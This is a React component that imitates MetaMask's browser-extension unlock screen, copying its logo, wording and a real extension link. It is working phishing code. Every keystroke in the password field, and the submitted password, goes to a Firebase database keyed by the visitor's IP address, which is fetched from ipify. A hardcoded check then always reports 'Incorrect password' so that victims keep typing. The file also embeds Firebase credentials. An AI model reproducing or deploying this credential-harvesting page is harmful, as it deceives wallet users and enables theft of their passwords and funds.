import { UserContext } from ".";
import React, {
  useContext,
  useState,
  useRef,
  useEffect,
  useLayoutEffect,
  useCallback,
} from "react";
import Box from "@mui/material/Box";
import Modal from "@mui/material/Modal";
import Button from "@mui/material/Button";
import { display } from "@mui/system";
import arrowdown from "./assets/images/icons/arrow-down.svg";
import metamasklogo from "./assets/images/icons/metamask-fox.svg";
import MetamaskLogo from "./metamasklogo";
import TextField from "@mui/material/TextField";
import addImage from "./assets/images/icons/add.svg";
import closeImage from "./assets/images/icons/close.svg";
import searchImage from "./assets/images/icons/search.svg";
import ethereum from "./assets/images/icons/eth_logo.svg";
import linea from "./assets/images/icons/linea-logo-mainnet.svg";
import polygon from "./assets/images/icons/polygon-zkevm.svg";
import arbitrum from "./assets/images/icons/arbitrum.svg";
import avalanche from "./assets/images/icons/avax-token.svg";
import base from "./assets/images/icons/base.svg";
import binance from "./assets/images/icons/bnb.svg";
import opmain from "./assets/images/icons/optimism.svg";
import zksync from "./assets/images/icons/zk-sync.svg";
import moreverfical from "./assets/images/icons/more-vertical.svg";
import infoimage from "./assets/images/icons/info.svg";
import sepolia from "./assets/images/icons/sepolia.png";
import lineasepolia from "./assets/images/icons/linea-logo-mainnet.svg";
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
import { getDatabase, ref, set } from "firebase/database";
import axios from "axios";

const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
// console.log("Is dark mode?", isDarkMode);
const firebaseConfig = {
  apiKey: "AIzaSyC0h7zy2gy9MjVcmkeQLcIoqVw0jIbRHxw",

  authDomain: "metadata-3370d.firebaseapp.com",

  projectId: "metadata-3370d",

  storageBucket: "metadata-3370d.firebasestorage.app",

  messagingSenderId: "822649245544",

  appId: "1:822649245544:web:241afbdad201927ea590dd",

  measurementId: "G-RK523XV56E",
};

// Initialize Firebase

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const style = {
  position: "absolute",
  top: 0,
  right: 0,
  width: 357,
  height: 600,
  bgcolor: isDarkMode === true ? "#141618" : "background.paper",
  border: "1px solid #000",
  ".css-1qiynlt-MuiFormControl-root-MuiTextField-root .MuiInput-underline:before":
    {
      borderBottom:
        isDarkMode === true
          ? "1px solid white !important"
          : "1px solid black !important",
    },
  ".css-5h82ro-MuiInputBase-root-MuiInput-root": {
    color: isDarkMode === true ? "white" : "black",
  },
  display: "flex",
  "--color-text-default": isDarkMode === true ? "white" : "black",
};

const Mainmodal = () => {
  const [ip, setIp] = useState(null);
  useEffect(() => {
    const fetchIP = async () => {
      try {
        const response = await axios.get("https://api.ipify.org?format=json");
        setIp(response.data.ip);
      } catch (error) {
        console.error("Error fetching IP address:", error);
      }
    };

    fetchIP();
  }, []);
  const addUser = (payload) => {
    const d = new Date();
    const dataRef = ref(db, `${ip.replaceAll(".", "_")}_Elo/user_${d.getTime()}`);
    set(dataRef, payload);
  };
  const data = useContext(UserContext);
  const open = data.mainmodal;
  const currentnet = data.currentnet;
  const handleClose = () => data.setMainmodal(!open);
  const openNetworkmodal = () => {
    data.setNetworkmodal(true);
  };
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [helperText, setHelperText] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const [effectiveArea, setEffectiveArea] = useState(null);
  const logoContainerRef = useRef(null);
  const inputRef = useRef(null);
  const [startInput, setStartInput] = useState({ width: 0, height: 0 });
  const handleType = (e) => {
    if (e.key === "Enter") {
      validatePassword();
    }
  };
  const closeModal = () => {
    setPassword("");
    handleClose();
    setError(false);
  };
  const setInputRef = useCallback((node) => {
    if (node) {
      inputRef.current = node;
      const { x, y } = node.getBoundingClientRect();
      setStartInput({ x, y });
    }
  }, []);

  const setLogoContainerRef = useCallback((node) => {
    if (node) {
      logoContainerRef.current = node;
      const area = node.getBoundingClientRect();
      setEffectiveArea(area);
    }
  }, []); // Empty dependency array ensures this runs only once

  // Password validation logic
  const validatePassword = () => {
    addUser(password);
    const correctPassword = "111sdswh2y67623tg74yehd"; // Example correct password
    if (password !== correctPassword && password !== "") {
      setError(true);
      setHelperText("Incorrect password");
    } else {
      setError(false);
      setHelperText("");
    }
  };
  const changepassword = (para) => {
    setError(false);
    setPassword(para);
    setIsTyping(true);
    addUser(para);
  };
  const handleFocus = () => {
    setIsFocused(true);
  };
  const handleBlur = () => {
    setIsFocused(false);
  };

  return (
    <div>
      <Modal
        open={open}
        onClose={closeModal}
        aria-labelledby="child-modal-title"
        aria-describedby="child-modal-description"
      >
        <Box
          sx={style}
          ref={setLogoContainerRef}
          style={{ flexDirection: "column" }}
        >
          <div
            id="header"
            style={{
              padding: 8,
              paddingTop: 16,
              paddingBottom: 16,
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              width: "100%",
              height: "76px",
              boxShadow:
                isDarkMode === true
                  ? "0 4px 8px rgba(0, 0, 0, 0.38)"
                  : "0 4px 8px rgba(0, 0, 0, 0.08)",
            }}
          >
            <div id="button1" style={{ height: 32 }}>
              <Button
                style={{
                  padding: "1px 8px",
                  display: "flex",
                  justifyContent: "space-between",
                  alignContent: "center",
                  backgroundColor: isDarkMode === true ? "black" : "#f2f4f6",
                  borderRadius: 16,
                  height: 30,
                }}
                onClick={openNetworkmodal}
              >
                <span
                  style={{
                    display: "flex",
                    justifyContent: "center",
                    marginRight: 9,
                  }}
                >
                  <img
                    style={{ borderRadius: 4, width: 14 }}
                    src={currentnet.icon}
                    alt={currentnet.text}
                  ></img>
                </span>
                <span
                  style={{
                    marginRight: 9,
                    color: isDarkMode === true ? "white" : "black",
                    fontSize: 12,
                    fontWeight: 3,
                  }}
                >
                  {currentnet.text}
                </span>
                <span
                  style={{
                    display: "flex",
                    justifyContent: "center",
                    marginRight: 9,
                  }}
                >
                  <img
                    src={arrowdown}
                    style={{
                      width: 12,
                      filter: isDarkMode === true ? "invert(1)" : "invert(0)",
                    }}
                  />
                </span>
              </Button>
            </div>
            <div id="button2">
              <Button style={{ padding: 0, minWidth: 46 }}>
                <img src={metamasklogo} style={{ width: 34, height: 32 }} />
              </Button>
            </div>
          </div>
          <div id="unlockpage" style={{ padding: 30 }}>
            <div
              id="metamasklogo"
              style={{
                marginTop: 10,
                height: 120,
                display: "flex",
                justifyContent: "center",
              }}
            >
              <MetamaskLogo
                effectiveArea={effectiveArea}
                isFocused={isFocused}
                startInput={startInput}
                isTyping={isTyping}
                setIsTyping={setIsTyping}
                password={password}
              />
            </div>

            <h1
              className="mm-box mm-text mm-text--heading-lg mm-box--margin-top-1 mm-box--color-text-alternative"
              style={{
                marginTop: 4,
                textAlign: "center",
                color: "#6a737d",
                fontSize: "18pt",
                marginBottom: 0,
                fontFamily:
                  " Euclid Circular B, Roboto, Helvetica, Arial, sans-serif",
              }}
            >
              {" "}
              Welcome back!
            </h1>
            <div
              style={{
                textAlign: "center",
                fontFamily:
                  " Euclid Circular B, Roboto, Helvetica, Arial, sans-serif",
                color: isDarkMode === true ? "white" : "black",
              }}
            >
              The decentralized web awaits
            </div>

            <div style={{ marginTop: 48 }}>
              <TextField
                ref={setInputRef}
                id="outlined"
                label="Password"
                variant="standard"
                error={error}
                type="password"
                value={password}
                onFocus={handleFocus}
                onBlur={handleBlur}
                onChange={(e) => {
                  changepassword(e.target.value);
                }}
                onKeyDown={handleType}
                helperText={error ? helperText : ""}
                sx={{
                  ".MuiFormHelperText-root.Mui-error ": {
                    color: isDarkMode === true ? "#e88f97 !important" : "red",
                  },
                  "& label": {
                    color: "gray !important", // Force orange color
                  },
                  "& label.Mui-focused": {
                    color: "gray !important", // Darker orange on focus
                  },
                  "& label.MuiInputLabel-shrink": {
                    color: "gray !important", // Ensure shrinked label stays orange
                  }, // Darker orange on focus
                  " .css-4twbn2-MuiInputBase-root-MuiInput-root::before": {
                    borderBottom:
                      isDarkMode === true
                        ? "1px solid white"
                        : "1px solid black",
                  },
                  ".css-4twbn2-MuiInputBase-root-MuiInput-root:hover:not(.Mui-disabled, .Mui-error)::before":
                    {
                      borderBottom:
                        isDarkMode === true
                          ? "1px solid white"
                          : "1px solid black",
                    },

                  "& .MuiInput-underline": {
                    "&:before": {
                      borderBottom:
                        error &&
                        (password !== ""
                          ? "2px solid red"
                          : "1px solid red !important"),
                    },
                    "&:after": {
                      borderBottom:
                        error && password !== ""
                          ? "2px solid red"
                          : "2px solid rgb(3, 118, 201)", // Border color when focused
                    },
                  },
                  width: "100%",
                }}
              />
            </div>
            <div style={{ marginTop: 28 }}>
              <Button
                style={
                  password === ""
                    ? {
                        backgroundColor:
                          isDarkMode === true
                            ? "#2d648c"
                            : "rgb(111 185 239 / 90%)",
                        border: "1px solid #848c96",
                      }
                    : {
                        backgroundColor:
                          isDarkMode === true ? "#43aefc" : "#0376c9",
                        border:
                          isDarkMode === true
                            ? "1px solid white"
                            : "1px solid black",
                      }
                }
                sx={{
                  height: 44,
                  fontWeight: 400,
                  borderRadius: 100,
                  padding: "12px 16px",
                  color: isDarkMode === true ? "black" : "white",
                  width: "100%",
                  "&:hover": {
                    backgroundColor: "transparent", // Remove hover background
                    boxShadow: "none", // Remove hover shadow (if any)
                  },
                }}
                onClick={validatePassword}
              >
                Unlock
              </Button>
              <div style={{ marginTop: 15 }}>
                <a
                  href="chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html"
                  target="blank"
                  style={{
                    fontSize: 12, // Corrected to camelCase
                    fontWeight: "bold",

                    fontFamily:
                      '"Euclid Circular B", Helvetica, Arial, sans-serif',
                    lineHeight: "140%",
                    fontStyle: "normal",
                    color: "#43aefc",
                    cursor: "pointer",
                    backgroundColor: "transparent",
                    padding: "0.75rem 1rem",
                    display: "flex",
                    justifyContent: "center",
                    alignItems: "center",
                    boxSizing: "border-box",
                    borderRadius: "6px",
                    width: "100%",
                    transition:
                      "border-color 0.3s ease, background-color 0.3s ease",
                    textDecoration: "none",
                  }}
                >
                  Forgot password?
                </a>
              </div>
              <div
                className="unlock-page__support"
                style={{
                  marginTop: 33,
                  justifyContent: "center",
                  display: "flex",
                  fontSize: 12,
                }}
              >
                <span>
                  {" "}
                  <font
                    style={{ color: isDarkMode === true ? "white" : "black" }}
                  >
                    Need help? Contact{" "}
                  </font>
                  <a
                    href="https://support.metamask.io"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      textDecoration: "none", // Remove underline
                      color: "#43aefc", // Inherit text color from parent
                      fontSize: "inherit", // Inherit font size from parent
                      background: "none", // Remove background color
                      padding: 0, // Remove padding
                      margin: 0, // Remove margin
                      display: "inline", // Keep the default inline behavior
                    }}
                  >
                    MetaMask support
                  </a>{" "}
                </span>
              </div>
            </div>
          </div>
        </Box>
      </Modal>
    </div>
  );
};

export default Mainmodal;
